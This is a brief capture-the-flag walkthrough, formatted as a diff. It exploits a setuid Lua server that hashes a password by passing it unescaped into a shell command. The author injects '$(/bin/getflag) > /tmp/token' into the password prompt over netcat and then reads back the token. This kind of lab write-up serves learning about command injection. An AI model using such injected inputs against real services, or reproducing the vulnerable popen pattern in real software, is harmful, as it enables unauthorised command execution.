@@ -1,0 +1,34 @@
+ll
+|
+L-> -rwsr-sr-x  1 flag11 [...] level11.lua*
+
+as always, this script is launch by the flag11 so let's see what's inside
+
+cat level11.lua
+|
+L-> local server = assert(socket.bind("127.0.0.1", 5151))
+L-> [...]
+L-> prog = io.popen("echo "..pass.." | sha1sum", "r")
+
+ok so there is a server launched on the port 5151 and we also see that the script ask for a password
+it's try to hash the password with a shell command
+the interresting part is the echo "..pass.." like this we can echo whatever we want
+let's use our shell skill to write the output of getflag in a tmp file
+
+nc 127.0.0.1 5151
+|
+L-> Password: 
+
+let's enter our command
+
+$(/bin/getflag) > /tmp/token
+|
+L-> Erf nope...
+
+not a problem let's check if we have our file
+
+cat /tmp/token
+|
+L-> Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
+here we go
